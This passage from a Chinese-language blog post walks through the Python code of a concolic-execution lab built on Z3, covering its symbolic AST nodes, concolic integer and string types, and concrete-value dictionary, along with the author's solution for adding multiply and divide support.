class_">sym_eq</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) == z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_and</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.And(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_or</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Or(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_not</span>(<span class="hljs-title class_ inherited__">sym_unop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Not(z3expr(self.a))<br></code></pre></td></tr></table></figure><p>符号数的加减乘除比较等操作都是基于上面封装的 <code>op</code> 类完成的：</p><blockquote><p>乘除等运算需要我们在后续的 Exercise 中自行实现</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_lt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &lt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_gt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &gt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_plus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) + z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_minus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) - z3expr(self.b)<br></code></pre></td></tr></table></figure><h4 id="III-常量">III. 常量</h4><p>字符串常量 <code>const_str</code> 、整型常量 <code>const_int</code> 、布尔常量 <code>const_bool</code> 的实现比较简单，主要就是继承自 <code>sym_ast</code> 并且储存对应的值，其中字符串常量在转为 Z3 表达式时会调用 <code>z3.StringVal()</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, v</span>):<br>    self.v = v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.v == o.v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.v)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.StringVal(self.v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, i</span>):<br>    self.i = i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.i == o.i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.i)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.i<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_bool</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, b</span>):<br>    self.b = b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_bool):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.b == o.b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.b)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.b<br></code></pre></td></tr></table></figure><h4 id="IV-符号变量">IV. 符号变量</h4><p>在该框架中定义了两种类型的符号变量：<code>sym_int</code> 与 <code>sym_str</code>，都是直接基础自 AST 节点类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Arithmetic</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Int(self.<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">###...</span><br><br><span class="hljs-comment">## String operations</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Const(self.<span class="hljs-built_in">id</span>, z3.StringSort())<br></code></pre></td></tr></table></figure><h4 id="V-混合变量">V. 混合变量</h4><p>正如前文所言，我们实际上在混合执行引擎当中使用的为混合型（concolic）的变量来储存约束值，框架中提供了三种类型的混合变量——<code>concolic_int</code> （整型）、 <code>concolic_str</code>（字符串）、<code>concolic_bytes</code>（字符数组），其中具体值（conctre value）存放在 <code>__v</code> 成员中，符号值（symbolic value）存放在 <code>__sym</code> 中</p><p>主要是<strong>大量的运算符重载</strong>，这里就不贴完整代码了，可以自己去看（笑）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_int</span>(<span class="hljs-title class_ inherited__">int</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    self = <span class="hljs-built_in">super</span>(concolic_int, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">## ...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_str</span>(<span class="hljs-title class_ inherited__">str</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">str</span><br>    self = <span class="hljs-built_in">super</span>(concolic_str, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_bytes</span>(<span class="hljs-title class_ inherited__">bytes</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">bytes</span><br>    self = <span class="hljs-built_in">super</span>(concolic_bytes, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><hr><p>接下来是 Exercise 2：通过增加整型乘法与除法支持来完成对 <code>symex/fuzzy.py</code> 中 <code>concolic_int</code> 的实现，我们需要重载额外的方法并为乘除法运算添加 AST 节点，并为这些 AST 节点应用 <code>_z3expr</code></p><blockquote><p><strong>Exercise 2.</strong> Finish the implementation of <code>concolic_int</code> by adding support for integer multiply and divide operations. You will need to overload additional methods in the <code>concolic_int</code> class (see the documentation for <a href="https://docs.python.org/3/library/operator.html">operator functions in Python 3</a>), add AST nodes for multiply and divide operations, and implement <code>_z3expr</code> appropriately for those AST nodes.</p><p>Look for the comments <code>Exercise 2: your code here</code> in <code>symex/fuzzy.py</code> to find places where we think you might need to write code to solve this exercise.</p><p>Run <strong>./check-concolic-int.py</strong> or <strong>make check</strong> to check that your changes to <code>concolic_int</code> work correctly.</p></blockquote><p>我们首先实现符号变量乘除所需的 <code>sym_binop</code> 子类，这里我们参照前面的加减运算直接调用 <code>z3expr()</code> 来返回 Z3 表达式即可</p><p>需要注意的是虽然 python 的除法运算有 <code>/</code> 与 <code>//</code>两种，但是 Z3并不支持 <code>ArithRef</code> 与 <code>int</code> 直接进行 <code>//</code> 运算，所以这里我们只实现一个普通的乘法即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement AST nodes for division and multiplication.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_mul</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) * z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_div</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) / z3expr(self.b)<br></code></pre></td></tr></table></figure><p>接下来我们重写 <code>concolic_int</code> 的乘法与除法，我们先参考一下 <code>concolic_int </code>中的加法运算方式：、</p><ul><li>首先判断运算对象是否为 <code>concolic_int</code> ，若是则将自身具体值加上对象具体值，否则直接加上该对象，结果存放到 <code>res</code></li><li>创建一个新的 <code>concolic_int</code> 实例作为返回值，<code>res</code> 作为其具体值部分，创建两个 <code>ast</code> 实例并利用 <code>sym_plus()</code> 计算结果作为新 concolic_int 的符号值部分</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v + o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v + o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_plus(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>那么我们的乘除法其实依葫芦画瓢即可，这里需要注意的是我们要同时实现 <code>/</code> 与 <code>//</code> 两种除法运算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement symbolic division and multiplication.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v * o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v * o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_mul(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__truediv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v / o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v / o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__floordiv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v // o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v // o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 2：</p><p><img src="https://s2.loli.net/2022/12/18/TBNqmRi5fVsFlCk.png" alt="image.png"></p><p>然后是 Exercise 3，主要是让我们熟悉混合执行系统的使用方式，这里提供的途径是修改 <code>symex_exercises.py</code> 以给予测试系统正确的输入：</p><blockquote><p><strong>Exercise 3.</strong> An important component of concolic execution is <code>concolic_exec_input()</code> in <code>symex/fuzzy.py</code>. We have given you the implementation. You will use it to build a complete concolic execution system. To understand how to use <code>concolic_exec_input()</code>, you should create an input such that you pass the first check in <code>symex/check-symex-int.py</code>. Don’t modify <code>symex/check-symex-int.py</code> directly, but instead modify <code>symex_exercises.py</code>. Run <strong>./check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>混合执行框架的核心组件便是 <code>symex/fuzzy.py</code>  中的  <code>concolic_exec_input()</code> ，题目说后续我们将用其实现一个完整的混合执行系统，那我们先来看其相关的具体实现</p><h3 id="混合执行框架代码浅析-Part-2">混合执行框架代码浅析  - Part 2</h3><h4 id="VI-具体值字典-ConcreteValues">VI.具体值字典 - ConcreteValues</h4><p>如前文所言，在混合执行下被测试的程序输入都存储在一个全局字典中，实为一个<code>ConctreteValues</code> 类对象，实际上就是 python 字典的一个 wrapper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ConcreteValues maintains a dictionary of variables name to values.</span><br><span class="hljs-comment"># If a variable is created and it doesn&#x27;t exist, we use a default</span><br><span class="hljs-comment"># value for the variable (0 for int and &#x27;&#x27; for string).</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteValues</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.concrete_values = &#123;&#125;<br></code></pre></td></tr></table></figure><p>在 <code>symex/fuzzy.py</code> 中有一个全局变量 <code>current_concrete_values</code>，实际上就是我们前面所说的全局具体值字典，我们可以使用<code>ConctreteValues.mk_global()</code> 使该对象变为全局引用，即我们每次使用只需要创建一个<code>ConctreteValues</code> 对象即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># During concolic execution, new variables will be added to</span><br><span class="hljs-comment"># current_concrete_values, which is an instance of ConcreteValues.</span><br><span class="hljs-comment"># This variable is global because application code, the concolic</span><br><span class="hljs-comment"># Execution engine, and test code, all create new variables.  We make</span><br><span class="hljs-comment"># it global so that we don&#x27;t have to modify application code.  At the</span><br><span class="hljs-comment"># start of a concolic execution we will set this variable to the</span><br><span class="hljs-comment"># concrete values to be used.</span><br><br>current_concrete_values=<span class="hljs-literal">None</span><br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">global</span> current_concrete_values<br>    current_concrete_values = self<br></code></pre></td></tr></table></figure><p>在该类中有三个查询字典内 id 对应具体值并返回混合值的函数，若 id 不在字典内则进行添加，同时在 <code>symex/fuzzy.py</code> 中带有三个对这些函数的 wrapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_int(sym_int(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_str(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_bytes(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br><span class="hljs-comment">#...</span><br><br><span class="hljs-comment"># Wrapper functions to allow application code to create new</span><br><span class="hljs-comment"># variables. They will be added to the current global current</span><br><span class="hljs-comment"># concrete values.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_int(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_str(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_bytes(<span class="hljs-built_in">id</span>, initval)<br></code></pre></td></tr></table></figure><p>除了上面的函数以外，也可以直接使用 <code>add()</code> 成员函数来向字典内添加映射：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, v</span>):<br>  self.concrete_values[<span class="hljs-built_in">id</span>] = v<br></code></pre></td></tr></table></figure><p>以及还有一个 <code>canonical_rep()</code> 成员函数用以返回字典中的键值对元组排序列表，以及 <code>var_names()</code> 用以返回 id 列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">canonical_rep</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(self.concrete_values.items())<br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">var_names</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.concrete_values.keys()<br></code></pre></td></tr></table></figure><p>以及一个 <code>inherit()</code> 成员函数用以从另一个字典中拷贝键值对：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">inherit</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> o.concrete_values:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = o.concrete_values[<span class="hljs-built_in">id</span>]<br></code></pre></td></tr></table></figure><h4 id="VII-concolic-exec-input-输入执行">VII. concolic_exec_input() - 输入执行</h4><p>该函数内容用以根据给予的字典对传入的函数进行执行，整体逻辑比较简单：</p><ul><li>初始化两个全局空列表 <code>cur_path_constr</code> （<strong>当前路径的条件约束</strong>）与 <code>cur_path_constr_callers</code>（当前路径的信息）</li><li>调用 <code>concrete_values.mk_global()</code> 使其成为一个全局字典</li><li>调用传入的函数指针来获得一个值 <code>v</code>，若参数 <code>verbose &gt; 1</code> 则打印两个列表的内容</li><li>最后的返回值为 <code>(v, cur_path_constr, cur_path_constr_callers)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 